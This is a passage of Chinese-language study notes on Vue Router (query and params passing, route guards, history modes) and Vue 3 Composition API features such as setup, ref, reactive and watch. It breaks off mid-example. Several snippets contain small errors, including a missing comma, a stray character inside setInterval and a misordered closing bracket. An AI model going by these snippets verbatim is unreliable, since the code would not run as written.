<router-link :to="/home/message/detail?id=666&title=你好">跳转</router-link>
<!-- 跳转并携带query参数，to的对象写法 -->
<router-link 
	:to="{
		path:'/home/message/detail',
		query:{
		   id:666,
       title:'你好'
		}
	}"
>跳转</router-link>
```

```vue
<!-- 接收参数 -->
<template>
	<ul>
		<li>消息编号：{{$route.query.id}}</li>
		<li>消息标题：{{$route.query.title}}</li>
	</ul>
</template>
```

# 路由的命名

路由的命名:可以简化路由的跳转

```javascript
{//在./router/index.js中
	path:'/demo',
	component:Demo,
	children:[
		{
			path:'test',
			component:Test,
			children:[
				{
          name:'hello'//给路由命名
					path:'welcome',
					component:Hello,
				}
			]
		}
	]
}
```

```javascript
<!--简化前，需要写完整的路径 -->
<router-link to="/demo/test/welcome">跳转</router-link>
<!--简化后，直接通过名字跳转 -->
<router-link :to="{name:'hello'}">跳转</router-link>
<!--简化写法配合传递参数 -->
<router-link 
	:to="{
		name:'hello',
		query:{
		   id:666,
       title:'你好'
		}
	}"
>跳转</router-link>
```

# 路由的params参数

```javascript
{//在./router/index.js中
	path:'/home',
	component:Home,
	children:[
		{
			path:'news',
			component:News
		},
		{
			component:Message,
			children:[
				{
					name:'xiangqing',
					path:'detail/:id/:title', //使用占位符声明接收params参数
					component:Detail
				}
			]
		}
	]
}
```

```javascript
<!-- 跳转并携带params参数，to的字符串写法 -->
<router-link :to="/home/message/detail/666/你好">跳转</router-link>
<!-- 跳转并携带params参数，to的对象写法 -->
<router-link 
	:to="{
		name:'xiangqing',
		params:{
		   id:666,
       title:'你好'
		}
	}"
>跳转</router-link>
```

# 路由的props配置

```javascript
{
  name:'xiangqing',
  path:'detail/:id',
  component:Detail,
  //第一种写法：props值为对象，该对象中所有的key-value的组合最终都会通过props传给Detail组件
  // props:{a:900}
  //第二种写法：props值为布尔值，布尔值为true，则把路由收到的所有params参数通过props传给Detail组件
  // props:true
  //props的第三种写法，值为函数
  props($route){//此处还可以使用连续解构赋值简写:`$route:{id,tetle}` 
  return {//下面直接使用`{id,title}`
  	id:$route.query.id,
  	title:$route.query.title,
  	a:1,
  	b:'hello'
        }
  }
}
```

# router-link的replace属性

路由跳转操作浏览器历史记录是一个堆:后进先出,而跳转到存在replace属性的router-link标签时,跳转前的那条标签就会被跳转后的标签覆盖

1. 作用：控制路由跳转时操作浏览器历史记录的模式
2. 浏览器的历史记录有两种写入方式：分别为push和replace，push是追加历史记录，replace是替换当前记录。路由跳转时候默认为push
3. 如何开启replace模式：`<router-link replace .......>News</router-link>`

# 编程式路由导航

编程式路由导航:不借助```<router-link> ```实现路由跳转，让路由跳转更加灵活

```vue
<template>
	<div class="col-xs-offset-2 col-xs-8">
		<div class="page-header">
			<h2>Vue Router Demo</h2>
			<button @click="back">后退</button>
			<button @click="forward">前进</button>
			<button @click="test">测试一下go</button>
		</div>
	</div>
</template>

<script>
	export default {
		name:'Banner',
		methods: {
			back(){
				this.$router.back()//历史记录后退API
			},
			forward(){
				this.$router.forward()//历史记录前进API
			},
			test(){
				this.$router.go(3)//接收参数为前进或后退的次数
			}
		},
	}
</script>
```

```vue
<template>
	<div>
		<ul>
			<li v-for="m in messageList" :key="m.id">
				<button @click="pushShow(m)">push查看</button>
				<button @click="replaceShow(m)">replace查看</button>
			</li>
		</ul>
		<hr>
		<router-view></router-view><!-- 展示路由跳转后的组件 -->
	</div>
</template>

<script>
	export default {
		name:'Message',
		data() {
			return {
				messageList:[]
			}
		},
		methods: {
			pushShow(m){
				this.$router.push({//this.$router.push:不替换的路由跳转
					name:'xiangqing',
					query:{
						id:m.id,
						title:m.title
					}
				})
			},
			replaceShow(m){
				this.$router.replace({//this.$router.replace:替换的路由跳转
					name:'xiangqing',
					query:{
						id:m.id,
						title:m.title
					}
				})
			}
		},
	}
</script>
```

# 缓存路由组件

```javascript
//让不展示的路由组件保持挂载，不被销毁
<keep-alive include="News"> //只缓存组件News
    <router-view></router-view>
</keep-alive>
```

# 两个新的生命周期钩子

路由组件所独有的两个钩子,用于捕获路由组件的激活状态:

1. ```activated```路由组件被激活时触发
2. ```deactivated```路由组件失活时触发

```vue
<template>
	<ul>
		<li :style="{opacity}">欢迎学习Vue</li>
	</ul>
</template>
<script>
	export default {
		name:'News',
		data() {
			return {
				opacity:1
			}
		}
    //News组件被缓存,所以切换后News组件不被销毁
    beforeDestroy() {
			console.log('News组件即将被销毁了')
			clearInterval(this.timer)//因此无法清除定时器
		},
		mounted(){
			this.timer = setInterval(() => {
				console.log('@')
				this.opacity -= 0.01
				if(this.opacity <= 0) this.opacity = 1
			},16)
		},
    //路由组件钩子:已缓存的路由组件被切换后处于失活状态
		activated() {
			console.log('News组件被激活了')
			this.timer = setInterval(() => {除,
				console.log('@')
				this.opacity -= 0.01
				if(this.opacity <= 0) this.opacity = 1
			},16)
		},
		deactivated() {
			console.log('News组件失活了')
			clearInterval(this.timer)//通过失活状态钩子清除定时器
		},
	}
</script>
```

# 路由守卫1

# 路由守卫2

1. 路由守卫:对路由进行权限控制
2. 分类：全局守卫、独享守卫、组件内守卫

```javascript
//在`rouer/index.js`文件中
//创建并暴露一个路由器
const router = new VueRouter({})

//全局前置守卫：初始化时执行、每次路由切换前执行
router.beforeEach((to,from,next)=>{
	console.log('beforeEach',to,from)
	if(to.meta.isAuth){ //判断当前路由是否需要进行权限控制
		if(localStorage.getItem('school') === 'atguigu'){ //权限控制的具体规则
			next() //放行
		}else{
			alert('暂无权限查看')
			// next({name:'guanyu'})
		}
	}else{
		next() //放行
	}
})

//全局后置守卫：初始化时执行、每次路由切换后执行
router.afterEach((to,from)=>{
	console.log('afterEach',to,from)
	if(to.meta.title){ 
		document.title = to.meta.title //修改网页的title
	}else{
		document.title = 'vue_test'
	}
})
```

# 独享路由守卫

```javascript
const router =  new VueRouter({
  routes:[
    {
      name:'zhuye',
      path:'/home',
      component:Home,
      meta:{title:'主页'},
      children:[
        {
          name:'xinwen',
          path:'news',
          component:News,
          meta:{isAuth:true,title:'新闻'},
          beforeEnter: (to, from, next) => {//在需布置独享路由守卫的路由中添加此回调
            console.log('独享路由守卫',to,from)
            if(to.meta.isAuth){ //判断是否需要鉴权
              if(localStorage.getItem('school')==='atguigu'){
                next()
              }else{
                alert('学校名不对，无权限查看！')
              }
            }else{
              next()
            }
          }
        },
      ]
    }
  ]
)}
```

# 组件内路由守卫

```vue
<template>
	<h2>我是About的内容</h2>
</template>

<script>
	export default {
		name:'About',
		//通过路由规则，进入该组件时被调用
		beforeRouteEnter (to, from, next) {
			console.log('About--beforeRouteEnter',to,from)
			if(to.meta.isAuth){ //判断是否需要鉴权
				if(localStorage.getItem('school')==='atguigu'){
					next()
				}else{
					alert('学校名不对，无权限查看！')
				}
			}else{
				next()
			}
		},

		//通过路由规则，离开该组件时被调用
		beforeRouteLeave (to, from, next) {
			console.log('About--beforeRouteLeave',to,from)
			next()
		}
	}
</script>
```

# 路由器的两种工作模式

1. 对于一个url来说，什么是hash值？—— 及其后面的内容就是hash值。
2. hash值不会包含在 HTTP 请求中，即：hash值不会带给服务器。
3. hash模式：
   1. 地址中永远带着号，不美观
   2. 若以后将地址通过第三方手机app分享，若app校验严格，则地址会被标记为不合法。
   3. 兼容性较好。
4. history模式：
   1. 地址干净，美观
   2. 兼容性和hash模式相比略差。
   3. 应用部署上线时需要后端人员支持，解决刷新页面服务端404的问题
   4. 解决方法是通过npm网站得connect-history-api-fallback插件

# element-ui基本使用

# element-ui按需引入

# vue3简介

github上的tags地址：https://github.com/vuejs/vue-next/releases/tag/v3.0.0

vue3相对vue2的改变:

1. 性能的提升
2. 源码的升级
   1. 使用Proxy代替defineProperty实现响应式
   2. 重写虚拟DOM的实现和Tree-Shaking
3. 新的特性
   1. Composition API（组合式API）
      - setup配置
      - ref与reactive
      - watch与watchEffect
      - provide与inject
   2. 新的内置组件
      - Fragment 
      - Teleport
      - Suspense
   3. 其他改变
      - 新的生命周期钩子
      - data 选项应始终被声明为一个函数
      - 移除keyCode支持作为 v-on 的修饰符

# 创建vue-cli创建vue3工程

vue-cli官方文档：https://cli.vuejs.org/zh/guide/creating-a-project.htmlvue-create

使用vue-cli创建vue3项目:

1. 查看@vue/cli版本，确保@vue/cli版本在4.5.0以上:`vue --version`或`vue -V`
2. 安装或者升级你的@vue/cli:`npm install -g @vue/cli`
3. 创建vue3工程:``vue create vue3_maaya`
4. 启动服务器:``cd vue_test`;`npm run serve`

# 使用vite创建vue3工程

`vite`是新一代前端构建工具,优势如下:

- 开发环境中，无需打包操作，可快速的冷启动
- 轻量快速的热重载（HMR）
- 真正的按需编译，不再等待整个应用编译完成
- webpack传统构建与vite构建:vue-cli就是webpack传统构建

vite创建vue3工程命令:

1. 创建工程:`npm init vite-app <project-name>`
2. 进入工程目录:`cd <project-name>`
3. 安装依赖:`npm install`
4. 运行:`npm run dev`
5. 备注:vite现在并没有大规模应用,所以webpack还是主流

webpack传统构建:

<img src="https://cn.vitejs.dev/assets/bundler.37740380.png"  />

vite构建:<img src="https://cn.vitejs.dev/assets/esm.3070012d.png"  />

# 分析工程

构造函数和工厂函数:

1. 构造函数使用``new Vue()``的形式创建,必须使用``new`且构造函数名首字母大写

2. 工厂函数直接调用即可

```javascript
//引入的不再是Vue构造函数了，引入的是一个名为createApp的工厂函数
import { createApp } from 'vue'
import App from './App.vue'

//创建应用实例对象——app(类似Vue2中使用Vue构造函数创建的vm,但app比vm更“轻”)
const app = createApp(App)
//挂载app组件
app.mount('app')
// 以下为完整写法
// createApp(app).mount('app')

setTimeout(()=>{//延时卸载app组件
  app.unmount("app")
},1000)

//vue.config.js中仍然使用vue2的lint关闭语法检查
```

```vue
<template>
	<!-- Vue3组件中的模板结构可以没有根标签:因为有Fragement虚拟标签 -->
	<img alt="Vue logo" src="./assets/logo.png">
	<HelloWorld msg="Welcome to Your Vue.js App"/>
</template>

<script>
	import HelloWorld from './components/HelloWorld.vue'

	export default {
		name: 'App',
		components: {
			HelloWorld
		}
	}
</script>
```

# 安装开发者工具

# 初识setup

1. 理解：Vue3.0中一个新的配置项,值为一个函数
2. `setup`是所有`Composition API`（组合API）"表演的舞台"
3. 组件中所用到的：数据、方法等等，均要配置在setup中。
4. setup函数的两种返回值：
   1. 若返回一个对象，则对象中的属性、方法, 在模板中均可以直接使用。（重点关注！）
   2. 若返回一个渲染函数：则可以自定义渲染内容
5. 注意点：
   1. 尽量不要与Vue2.x配置混用
      - Vue2.x配置（data、methos、computed...）中可以访问到setup中的属性、方法。
      - 但在setup中不能访问到Vue2.x配置（data、methos、computed...）。
      - 如果有重名, setup优先。
   2. setup不能是一个async函数，因为返回值不再是return的对象, 而是promise, 模板看不到return对象中的属性（后期也可以返回一个Promise实例，但需要Suspense和异步组件的配合）

```vue
<template>
<h1>一个人的信息</h1>
<h2>姓名：{{name}}</h2>
<h2>年龄：{{age}}</h2>
<h2>性别：{{sex}}</h2>
<h2>a的值是：{{a}}</h2>
<button @click="sayHello">说话(Vue3所配置的——sayHello)</button>
<button @click="sayWelcome">说话(Vue2所配置的——sayWelcome)</button>
<button @click="test1">测试一下在Vue2的配置中去读取Vue3中的数据、方法</button>
<button @click="test2">测试一下在Vue3的setup配置中去读取Vue2中的数据、方法</button>
</template>
<script>
  // import {h} from 'vue' //引入渲染函数
  // 以下为vue2和vue3混合配置
  export default {
    name: 'App',
    data() {
      return {
        sex:'男',
        a:100
      }
    },
    methods: {
      sayWelcome(){
        alert('欢迎来到尚硅谷学习')
      },
      test1(){
        console.log(this.sex)
        console.log(this.name)
        console.log(this.age)
        console.log(this.sayHello)
      }
    },
    setup(){
      //数据
      let name = '张三'
      let age = 18
      let a = 200
      //方法
      function sayHello(){
        alert(`我叫${name}，我${age}岁了，你好啊！`)
      }
      function test2(){
        console.log(name)
        console.log(age)
        console.log(sayHello)
        console.log(this.sex)
        console.log(this.sayWelcome)
      }
      //返回一个对象（常用）
      return {
        name,
        age,
        sayHello,
        test2,
        a
      }
      //返回一个渲染函数:渲染函数会将template中的内容完全替换
      //return ()=> h('h1','尚硅谷') //完整写法:`return ()=>{return h("h1","尚硅谷")}`
    }
  }
</script>
```

# ref函数_处理基本类型

- 作用: 定义一个响应式的数据
- 语法: ```const xxx = ref(initValue)``` 
  - 创建一个包含响应式数据的引用对象（reference对象，简称ref对象）
  - JS中操作数据： ```xxx.value```
  - 模板中读取数据: 不需要.value，直接：```<div>{{xxx}}</div>```
- 备注：
  - 接收的数据可以是：基本类型、也可以是对象类型。
  - 基本类型的数据：响应式依然是靠``Object.defineProperty()``的```get```与```set```完成的

```vue
<template>
	<h1>一个人的信息</h1>
	<h2>姓名：{{name}}</h2><!-- vue3检测到name是一个引用对象后自动将name转化为name.value -->
	<h2>年龄：{{age}}</h2>
	<button @click="changeInfo">修改人的信息</button>
</template>
<script>
	import {ref} from 'vue'
	export default {
		name: 'App',
		setup(){
			//数据:通过ref添加的属性本质上都是一个引用对象(引用实现构造函数的实例对象) ref:reference implement
			let name = ref('张三')
			let age = ref(18)
			//方法
			function changeInfo(){
				name.value = '李四'
				age.value = 48
				console.log(name,age)
			}
			//返回一个对象（常用）
			return {
				name,
				age,
				changeInfo
			}
		}
	}
</script>
```

# ref函数_处理对象类型

ref函数处理对象类型数据是求助了reactive函数

```vue
<template>
	<h1>一个人的信息</h1>
	<h3>工作种类：{{job.type}}</h3>
	<h3>工作薪水：{{job.salary}}</h3>
	<button @click="changeInfo">修改人的信息</button>
</template>
<script>
	import {ref} from 'vue'
	export default {
		name: 'App',
		setup(){
			//ref函数处理对象类型数据:返回的是一个ref引用对象,通过引用对象的`.value`值获得的是一个object对象转为的proxy对象
			let job = ref({
				type:'前端工程师',
				salary:'30K'
			})
			//方法
			function changeInfo(){
				console.log(job.value)
				job.value.type = 'UI设计师'//type之后不需要带上属性value
				job.value.salary = '60K'
			}
			//返回一个对象（常用）
			return {
				job,
				changeInfo
			}
		}
	}
</script>
```

# reactive函数

- 作用:定义一个对象类型的响应式数据（基本类型不要用它，要用```ref```函数）
- 语法：```const 代理对象= reactive(源对象)```接收一个对象（或数组），返回一个代理对象（Proxy的实例对象，简称proxy对象）,这样数据就变成响应式
- reactive定义的响应式数据是“深层次的”。
- 内部基于ES6的Proxy实现，通过代理对象操作源对象内部数据进行操作

```vue
<template>
	<h1>一个人的信息</h1>
	<h2>姓名：{{person.name}}</h2>
	<h2>年龄：{{person.age}}</h2>
	<h3>工作种类：{{person.job.type}}</h3>
	<h3>工作薪水：{{person.job.salary}}</h3>
	<h3>爱好：{{person.hobby}}</h3>
	<h3>测试的数据c：{{person.job.a.b.c}}</h3>
	<button @click="changeInfo">修改人的信息</button>
</template>
<script>
	import {reactive} from 'vue'
	export default {
		name: 'App',
		setup(){
			//数据
			let person = reactive({ //相当于data了
				name:'张三',
				age:18,
				job:{//reacive可以监控深层次的数据变化
					type:'前端工程师',
					salary:'30K',
					a:{
						b:{
							c:666
						}
					}
				},
				hobby:['抽烟','喝酒','烫头']//reacive可以处理数组
			})
			//方法
			function changeInfo(){
				person.name = '李四'
				person.age = 48
				person.job.type = 'UI设计师'
				person.job.salary = '60K'
				person.job.a.b.c = 999
				person.hobby[0] = '学习'//不需要使用数组的七个方法改变的数据也能被vue3检测到了
			}
			//返回一个对象（常用）
			return {
				person,
				changeInfo
			}
		}
	}
</script>
```

# 回顾vue2的响应式原理

- 实现原理：
  - 对象类型：通过```Object.defineProperty()```对属性的读取、修改进行拦截（数据劫持）。
  - 数组类型：通过重写更新数组的一系列方法(这些方法本质上是vue2通过二次封装重写后数组身上的方法)来实现拦截。（对数组的变更方法进行了包裹）

````javascript
Object.defineProperty(p,'name',{
  configurable:true,//这个属性可以开启后就可以用`delete`删除p代理person的数据即 `delete p.name`
  get(){ //有人读取name时调用
    return person.name
  },
  set(value){ //有人修改name时调用
    console.log('有人修改了name属性，我发现了，我要去更新界面！')
    person.name = value
  }
})
````

- 存在问题：
  - 新增属性、删除属性,界面不会更新。
  - 直接通过下标修改数组, 界面不会自动更新。

# vue3的响应式原理_Proxy

模拟vue3中实现响应式:同时也是增删改查

- 通过Proxy(代理):拦截对象中任意属性的变化,包括:属性值的读写、属性的添加、属性的删除等。
- 通过Reflect（反射:对源对象的属性进行操作。

````javascript
const p = new Proxy(person,{//target:person(即proxy构造函数中的参数,要被代理的那个数据);propName:要修改的属性的属性名;
//有人读取p的某个属性时调用
get(target,propName){
console.log(`有人读取了p身上的${propName}属性`)
return Reflect.get(target,propName)
},
//有人修改p的某个属性、或给p追加某个属性时调用
set(target,propName,value){//value:要修改的属性被修改后的值
console.log(`有人修改了p身上的${propName}属性，我要去更新界面了！`)
Reflect.set(target,propName,value)
},
//有人删除p的某个属性时调用
deleteProperty(target,propName){
console.log(`有人删除了p身上的${propName}属性，我要去更新界面了！`)
return Reflect.deleteProperty(target,propName)
}
})
````

# vue3的响应式原理_Reflect

```javascript
//Reflect和Object的区别,或者说Reflect的好处,这是本节老师想表达的
//1.Object重复增加同名属性
Object.defineProperty(obj,'c',{
  get(){
    return 3
  }
})
Object.defineProperty(obj,'c',{
  get(){
    return 4
  }
})
console.log("成功执行")//用Object重复增加`c`属性报错,因此此行代码不被执行
//2.Reflcet重复增加同名属性
const x1 = Reflect.defineProperty(obj,'c',{
  get(){
    return 3
  }
})
console.log(x1)

const x2 = Reflect.defineProperty(obj,'c',{
  get(){
    return 4
  }
}) 
if(x2){//x1和x2的返回值是boolean
  console.log('某某某操作成功了！')
}else{
  console.log('某某某操作失败了！')
}
console.log('@@@')//此行代码依然会执行,并且通过if()也能得到Reflect代码的执行结果
```

# reactive对比ref

-  从定义数据角度对比：
   -  ref用来定义：基本类型数据
   -  reactive用来定义：对象（或数组）类型数据
   -  备注：ref也可以用来定义对象（或数组）类型数据, 它内部会自动通过```reactive```转为代理对象
-  从原理角度对比：
   -  ref通过``Object.defineProperty()``的```get```与```set```来实现响应式（数据劫持）。
   -  reactive通过使用ES6中的新构造函数Proxy来实现响应式（数据劫持）, 并通过Reflect操作源对象内部的数据。
-  从使用角度对比：
   -  ref定义的数据：操作数据需要```.value```，读取数据时模板中直接读取不需要```.value```。
   -  reactive定义的数据：操作数据与读取数据：均不需要```.value```。

# setup的两个注意点

- setup执行的时机:只在beforeCreate之前执行一次,且里面的this是undefined。
- setup接收的的参数
  - props：值为对象，包含：组件外部传递过来，且组件内部声明接收了的属性。
  - context：上下文对象
    - attrs: 值为对象，包含：组件外部传递过来，但没有在props配置中声明的属性, 相当于 ```this.$attrs```。
    - slots: 收到的插槽内容, 相当于 ```this.$slots```。
    - emit: 分发自定义事件的函数, 相当于 ```this.$emit```。
- 父组件通过props属性给子组件传递数据时,如果子组件不适用`props:[]`接收,那么子组件的实例对象仍会收到,但是属性将会出现在`vc.$attrs`身上,并且通过这样接收的`props`无法限制数据类型
- 同理:父组件通过插槽的方式给子组件传递html标签,如果子组件不通过`slot`标签接收,那么html标签转化为的`virtul DOM`也是出现在`vc.$slot`上

```vue
<template>
	<Demo @hello="showHelloMsg" msg="你好啊" school="尚硅谷"><!-- 绑定自定义事件 -->
		<template v-slot:qwe>
			<span>尚硅谷</span>
		</template>
		<template v-slot:asd><!-- 使用具名插槽时使用v-slot绑定 -->
			<span>尚硅谷</span>
		</template>
	</Demo>
</template>
<script>
	import Demo from './components/Demo'
	export default {
		name: 'App',
		components:{Demo},
		setup(){
			function showHelloMsg(value){
				alert(`你好啊，你触发了hello事件，我收到的参数是:${value}！`)
			}
			return {
				showHelloMsg
			}
		}
	}
</script>
```

```vue
<template>
	<h1>一个人的信息</h1>
	<h2>姓名：{{person.name}}</h2>
	<h2>年龄：{{person.age}}</h2>
	<button @click="test">测试触发一下Demo组件的Hello事件</button>
</template>

<script>
	import {reactive} from 'vue'
	export default {
		name: 'Demo',
		props:['msg','school'],//需要声明已经接收到props才能在setup中使用props参数
		emits:['hello'],//vue3中需要声明已经接收到自定义事件,否则会warning
		setup(props,context){//context:包含attr,emit,slot;如果存在props,但是不使用它就会warning,并且props已经被proxy代理了,是响应式数据
			// console.log('---setup---',props)
			// console.log('---setup---',context)
			// console.log('---setup---',context.attrs) //相当与Vue2中的$attrs
			// console.log('---setup---',context.emit) //触发自定义事件的。
			console.log('---setup---',context.slots) //插槽
			//数据
			let person = reactive({
				name:'张三',
				age:18
			})
			//方法
			function test(){
				context.emit('hello',666)//调用自定义事件
			}
			//返回一个对象（常用）
			return {
				person,
				test
			}
		}
	}
</script>
```

# computed计算属性

与Vue2.x中computed配置功能一致

```vue
<template>
	<h1>一个人的信息</h1>
	姓：<input type="text" v-model="person.firstName">
	<br>
	名：<input type="text" v-model="person.lastName">
	<br>
	<span>全名：{{person.fullName}}</span>
	<br>
	全名：<input type="text" v-model="person.fullName">
</template>

<script>
	import {reactive,computed} from 'vue'
	export default {
		name: 'Demo',
		setup(){
			//数据
			let person = reactive({
				firstName:'张',
				lastName:'三'
			})
			//计算属性——简写（没有考虑计算属性被修改的情况）
			/* person.fullName = computed(()=>{
				return person.firstName + '-' + person.lastName
			}) */

			//计算属性——完整写法（考虑读和写）
			person.fullName = computed({
				get(){
					return person.firstName + '-' + person.lastName
				},
				set(value){
					const nameArr = value.split('-')
					person.firstName = nameArr[0]
					person.lastName = nameArr[1]
				}
			})
			//返回一个对象（常用）
			return {
				person
			}
		}
	}
</script>
```

# watch监视ref定义的数据

```vue
<script>
	import {ref,reactive,watch} from 'vue'
	export default {
		name: 'Demo',
		setup(){
			//数据
			let sum = ref(0)
			let msg = ref('你好啊')
			//情况一：监视ref所定义的一个响应式数据
			watch(sum,(newValue,oldValue)=>{
				console.log('sum变了',newValue,oldValue)
			},{immediate:true}) 

			//情况二：监视ref所定义的多个响应式数据:通过数组传入
			watch([sum,msg],(newValue,oldValue)=>{
				console.log('sum或msg变了',newValue,oldValue)
			},{immediate:true})
      
			//返回一个对象（常用）
			return {
				sum,
				msg,
				person
			}
		}
	}
</script>
```

# watch监视reactive定义的数据

```js 
/* 
	情况三：监视reactive定义的响应式数据
	若watch监视reactive定义的响应式数据，则获得的oldValue和newValue相同
*/
watch(person,(newValue,oldValue)=>{
	console.log('person变化了',newValue,oldValue)
},{immediate:true,deep:false}) //watch监视reactive数据,强制开启深度监视,因此deep配置不奏效

//情况四：监视reactive定义的响应式数据中的某个属性:watch只能监视ref,reactive,arr,fun等数据类型的值,而person.name就是一个字符串这类的基础数据类型,所以通过函数返回值来
watch(()=>person.job,(newValue,oldValue)=>{
	console.log('person的job变化了',newValue,oldValue)
},{immediate:true,deep:true}) 

//情况五：监视reactive定义的响应式数据中的某些属性
watch([()=>person.job,()=>person.name],(newValue,oldValue)=>{
	console.log('person的job变化了',newValue,oldValue)
},{immediate:true,deep:true})

//特殊情况
watch(()=>person.job,(newValue,oldValue)=>{
    console.log('person的job变化了',newValue,oldValue)
},{deep:true}) //此处由于监视的是reactive素定义的对象中的某个属性，所以deep配置有效
```

# watch监视ref时的value问题

```vue
<script>
	import {ref,reactive,watch} from 'vue'
	export default {
		name: 'Demo',
		setup(){
			//数据
			let sum = ref(0)
			let msg = ref('你好啊')
			let person = ref({
				name:'张三',
				age:18,
				job:{
					j1:{
						salary:20
					}
				}
			})
			watch(sum,(newValue,oldValue)=>{//监视ref生成的基本数据类型不需要添加`.value`属性,是由于这个`ref.value`是一个数字
				console.log('sum的值变化了',newValue,oldValue)
			})
      //方法1"监视ref生成的对象数据类型需要添加`.value`属性,是由于这个`ref.value`是一个对象
			watch(person,(newValue,oldValue)=>{//方法2:开启深度监视,那么这个对象的地址值被改变,以及对象中的属性被改变都会被监视到
				console.log('person的值变化了',newValue,oldValue)
			},{deep:true})

			//返回一个对象（常用）
			return {
				sum,
				msg,
				person
			}
		}
	}
</script>
```

# watchEffect函数

- watch：既要指明监视的属性，也要指明监视的回调。
- watchEffect：不用指明监视哪个属性，监视的回调中用到哪个属性，那就监视哪个属性。
- watchEffect有点像computed：

  - 但computed注重的计算出来的值（回调函数的返回值），所以必须要写返回值。
  - 而watchEffect更注重的是过程（回调函数的函数体），所以不用写返回值。

```javascript
//watchEffect所指定的回调中用到的数据只要发生变化，则直接重新执行回调。
watchEffect(()=>{
    const x1 = sum.value
    const x2 = person.age
    console.log('watchEffect配置的回调执行了')
})
```

# vue3生命周期

vue3必须用`Vue.createApp(options).mount(el)`明确根容器的名字,不能像vue2一样,先创建`vm`,再`vm.$mount(el)`挂载

Vue3也提供了Composition API形式的生命周期钩子，与Vue2.x中钩子对应关系如下：

- `beforeDestory`和`Destory`改为`beforeUnmounted`和`Unmounted`

- `beforeCreate`===>`setup()`
- `created`=======>`setup()`
- `beforeMount` ===>`onBeforeMount`
- `mounted`=======>`onMounted`
- `beforeUpdate`===>`onBeforeUpdate`
- `updated` =======>`onUpdated`
- `beforeUnmount` ==>`onBeforeUnmount`
- `unmounted` =====>`onUnmounted`

<img src="https://v3.cn.vuejs.org/images/lifecycle.svg" alt="lifecycle_2" />

# hook函数

- hook函数:本质是一个函数，把setup函数中使用的Composition API进行了封装。
- 类似于vue2.x中的mixin。
- 自定义hook的优势: 复用代码,让setup中的逻辑更清楚易懂

```vue
<template>
	<h2>我是Test组件</h2>
	<h2>当前点击时鼠标的坐标为：x：{{point.x}}，y：{{point.y}}</h2>
</template>

<script>
	import usePoint from '../hooks/usePoint'
	export default {
		name:'Test',
		setup(){
			const point = usePoint()//使用hook封装鼠标坐标获取函数得到的值
			return {point}
		}
	}
</script>
```

```javascript
//此js文件需要放在和src同级的hooks文件夹的路径下
import {reactive,onMounted,onBeforeUnmount} from 'vue'
export default function (){
	//实现鼠标“打点”相关的数据
	let point = reactive({
		x:0,
		y:0
	})
	//实现鼠标“打点”相关的方法
	function savePoint(event){
		point.x = event.pageX
		point.y = event.pageY
		console.log(event.pageX,event.pageY)
	}
	//实现鼠标“打点”相关的生命周期钩子
	onMounted(()=>{
		window.addEventListener('click',savePoint)
	})
	onBeforeUnmount(()=>{
		window.removeEventListener('click',savePoint)
	})
	return point
}
```

# toRef和toRefs

- 作用：创建一个ref对象,其value值指向另一个对象中的某个属性。
- 语法：```const name = toRef(person,'name')```
- 应用:要将响应式对象中的某个属性单独提供给外部使用时。


- 扩展：```toRefs```与```toRef```功能一致，但可以批量创建多个ref对象，语法：```toRefs(person)```

```vue
<script>
	import {ref,reactive,toRef,toRefs} from 'vue'
	export default {
		name: 'Demo',
		setup(){
			//数据
			let person = reactive({
				name:'张三',
				age:18,
				job:{
					j1:{
						salary:20
					}
				}
			})
			// const name1 = person.name
			// console.log('%%%',name1)

			// const name2 = toRef(person,'name')
			// console.log('',name2)

			const x = toRefs(person)
			console.log('******',x)

			//返回一个对象（常用）
			return {
				person,
        //name:person.name;错误的写法
        //name:ref(person.name);错误的写法
				// name:toRef(person,'name'),
				// age:toRef(person,'age'),
				// salary:toRef(person.job.j1,'salary'),
				...toRefs(person)
			}
		}
	}
</script>
```

# shallowReactive与shallowRef

- shallowReactive：只处理对象最外层属性的响应式（浅响应式）。
- shallowRef:只处理基本数据类型的响应式,不进行对象的响应式处理。

- 什么时候使用?
  -  如果有一个对象数据，结构比较深, 但变化时只是外层属性变化`shallowReactive。`
  -  如果有一个对象数据，后续功能不会修改该对象中的属性，而是生新的对象来替换`shallowRef`

```vue
<script>
	import {ref,reactive,toRef,toRefs,shallowReactive,shallowRef} from 'vue'
	export default {
		name: 'Demo',
		setup(){
			//数据
			// let person = shallowReactive({ //只考虑第一层数据的响应式
			let person = reactive({
				name:'张三',
				age:18,
				job:{
					j1:{
						salary:20
					}
				}
			})
			let x = shallowRef({
				y:0
			})
			console.log('******',x)
			//返回一个对象（常用）
			return {
				x,
				person,
				...toRefs(person)
			}
		}
	}
</script>
```

# readonly与shallowReadonly

- readonly: 让一个响应式数据变为只读的（深只读）。
- shallowReadonly：让一个响应式数据变为只读的（浅只读）。
- 应用场景: 不希望数据被修改时数据

```vue
<script>
	import {ref,reactive,toRefs,readonly,shallowReadonly} from 'vue'
	export default {
		name: 'Demo',
		setup(){
			//数据
			let sum = ref(0)
			let person = reactive({
				name:'张三',
				age:18,
				job:{
					j1:{
						salary:20
					}
				}
			})
			person = readonly(person)//可能出现这个person是别人组件中的组件,它交给你是使用,但不允许你更改,所以就使用readonly封装覆盖
			// person = shallowReadonly(person)
			// sum = readonly(sum)
			// sum = shallowReadonly(sum)

			//返回一个对象（常用）
			return {
				sum,
				...toRefs(person)
			}
		}
	}
</script>
```

# toRaw和markRaw

- toRaw：
  - 作用：将一个由```reactive```生成的响应式对象转为普通对象。
  - 使用场景：用于读取响应式对象对应的普通对象，对这个普通对象的所有操作，不会引起页面更新。
- markRaw：
  - 作用：标记一个对象，使其永远不会再成为响应式对象。
  - 应用场景:
    1. 有些值不应被设置为响应式的，例如复杂的第三方类库等。
    2. 当渲染具有不可变数据源的大列表时，跳过响应式转换可以提高性能。

```vue
<script>
	import {ref,reactive,toRefs,toRaw,markRaw} from 'vue'
	export default {
		name: 'Demo',
		setup(){
			//数据
			let sum = ref(0)
			let person = reactive({
				name:'张三',
				age:18,
				job:{
					j1:{
						salary:20
					}
				}
			})

			function showRawPerson(){
				const p = toRaw(person)
				p.age++
				console.log(p)
			}

			function addCar(){
				let car = {name:'奔驰',price:40}
				person.car = markRaw(car)
			}

			function changePrice(){
				person.car.price++
				console.log(person.car.price)
			}

			//返回一个对象（常用）
			return {
				sum,
				person,
				...toRefs(person),
				showRawPerson,
				addCar,
				changePrice
			}
		}
	}
</script>
```

# customRef

创建一个自定义的ref，并对其依赖项跟踪和更新触发进行显式控制

```vue
<script>
	import {ref,customRef} from 'vue'
	export default {
		name: 'App',
		setup() {
			//自定义一个ref——名为：myRef
			function myRef(value,delay){
				let timer
				return customRef((track,trigger)=>{
					return {
						get(){
